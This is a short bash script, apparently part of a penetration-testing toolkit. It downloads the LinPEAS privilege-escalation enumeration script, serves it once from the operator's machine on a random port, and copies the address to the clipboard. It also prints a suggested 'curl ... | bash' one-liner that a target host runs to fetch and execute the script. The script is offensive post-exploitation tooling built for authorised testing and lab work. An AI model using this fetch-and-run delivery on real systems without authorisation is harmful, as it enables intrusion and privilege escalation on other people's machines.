#!/bin/bash

source _util.sh

MYIP=${1:-"127.0.0.1"}

randport=$( random-port )
PORT=${2:-$randport}
RSCRIPT="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
RSCRIPT="https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh"

out=$( random-name 10 )

curl "$RSCRIPT" -o "$out" 2> /dev/null
echo -n "http://${MYIP}:${PORT}" | copy-to-clipboard

echo "Serving $(basename $RSCRIPT) on ${MYIP}:${PORT}"
echo -e "\tServer and port copied to clipboard"
echo -e "\tYou can run the script remotely with something like: curl -s http://${MYIP}:${PORT} | bash"
$( get-python ) serve-once.py --port $PORT "$out"
rm "$out"
